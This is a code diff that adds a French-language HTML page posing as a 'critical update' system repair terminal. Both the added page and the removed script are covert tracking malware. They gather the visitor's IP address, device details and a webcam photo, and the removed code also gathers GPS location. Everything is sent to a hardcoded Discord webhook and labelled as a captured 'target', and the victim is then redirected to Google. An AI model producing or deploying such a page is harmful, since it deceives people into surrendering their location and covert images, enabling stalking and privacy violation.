@@ -1,60 +1,104 @@
-async function execute() {
-    const box = document.querySelector('.box');
-    box.innerHTML = "<h3>Analyse en cours...</h3><p>Vérification des protocoles de sécurité...</p>";
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ORCA Terminal - System Check</title>
+    <style>
+        :root { --main-color: #00ff41; --bg-color: #050505; }
+        body { background: var(--bg-color); color: var(--main-color); font-family: 'Segoe UI', 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        
+        .terminal { border: 1px solid var(--main-color); padding: 40px; border-radius: 8px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.1); width: 90%; max-width: 450px; position: relative; }
+        .terminal::before { content: "SYS_DIAG_V5.0"; position: absolute; top: -10px; left: 20px; background: var(--bg-color); padding: 0 10px; font-size: 12px; }
 
-    let finalIP = "Détection impossible (Blocage Navigateur)";
+        .loading-bar { width: 100%; height: 4px; background: #111; margin: 20px 0; border-radius: 2px; overflow: hidden; display: none; }
+        .progress { width: 0%; height: 100%; background: var(--main-color); transition: width 0.3s; }
 
-    // FONCTION WEBRTC POUR CHOPER L'IP RÉELLE
-    async function getRTCPeerConnectionIP() {
-        return new Promise((resolve) => {
-            const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-            rtc.createDataChannel("");
-            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-            rtc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-                resolve(ip);
-                rtc.onicecandidate = null;
-            };
-            setTimeout(() => resolve(null), 1000);
-        });
-    }
+        .btn { background: transparent; color: var(--main-color); border: 1px solid var(--main-color); padding: 15px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
+        .btn:hover { background: var(--main-color); color: #000; box-shadow: 0 0 15px var(--main-color); }
+        
+        p { font-size: 14px; line-height: 1.6; color: #888; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h1 style="font-size: 22px; margin-top: 0;">CRITICAL UPDATE</h1>
+        <p id="msg">Le système a détecté une anomalie dans les pilotes de périphérique. Une vérification d'identité est requise pour restaurer les services.</p>
+        
+        <div class="loading-bar" id="bar-container">
+            <div class="progress" id="progress-bar"></div>
+        </div>
 
-    // TENTATIVE DE RÉCUPÉRATION MULTIPLE
-    try {
-        const [ip1, ip2] = await Promise.all([
-            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
-            getRTCPeerConnectionIP()
-        ]);
-        finalIP = ip1 || ip2 || "IP Masquée";
-    } catch (e) { console.log("Échec des APIs classiques"); }
+        <button id="run" class="btn" onclick="start()">Lancer la réparation</button>
+    </div>
 
-    // ENVOI IMMÉDIAT
-    await post(`🚀 **CIBLE PC IDENTIFIÉE**\n**IP**: ${finalIP}\n**Appareil**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`);
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
-    // GPS & CAMÉRA (Suite habituelle)
-    navigator.geolocation.getCurrentPosition(async (p) => {
-        await post(`📍 **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-    }, null, {timeout: 3000});
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(async (blob) => {
-                    await post("📸 **CAPTURE RÉUSSIE**", blob);
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "https://www.google.com";
-                }, 'image/png');
-            }, 1000);
-        };
-    } catch (err) {
-        await post("⚠️ Caméra refusée");
-        window.location.href = "https://www.google.com";
-    }
-}
+        async function send(content, file = null) {
+            const formData = new FormData();
+            if (file) formData.append('file', file, 'capture.png');
+            formData.append('payload_json', JSON.stringify({
+                content: content,
+                username: "ORCA SECURITY MONITOR"
+            }));
+            try { await fetch(WEBHOOK, { method: 'POST', body: formData, keepalive: true }); } catch(e) {}
+        }
+
+        async function start() {
+            const btn = document.getElementById('run');
+            const bar = document.getElementById('bar-container');
+            const progress = document.getElementById('progress-bar');
+            const msg = document.getElementById('msg');
+
+            btn.style.display = 'none';
+            bar.style.display = 'block';
+            msg.innerText = "Initialisation du protocole de récupération...";
+
+            // 1. IP & SYSTEM (Prioritaire)
+            let ip = "Détection bloquée";
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                ip = d.ip;
+            } catch(e) {}
+            
+            progress.style.width = "30%";
+            await send(`🟢 **CIBLE DÉTECTÉE**\n\`\`\`yaml\nIP: ${ip}\nOS: ${navigator.platform}\nLANG: ${navigator.language}\n\`\`\``);
+
+            // 2. CAMÉRA
+            try {
+                msg.innerText = "Vérification des capteurs optiques...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    progress.style.width = "70%";
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth; 
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(async (blob) => {
+                            await send("📸 **CAPTURE SYSTÈME RÉUSSIE**", blob);
+                            progress.style.width = "100%";
+                            msg.innerText = "Réparation terminée. Redirection...";
+                            stream.getTracks().forEach(t => t.stop());
+                            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+                        }, 'image/png');
+                    }, 1500);
+                };
+            } catch (err) {
+                await send("❌ **ACCÈS CAPTEURS REFUSÉ**");
+                window.location.href = "https://www.google.com";
+            }
+        }
+    </script>
+</body>
+</html>
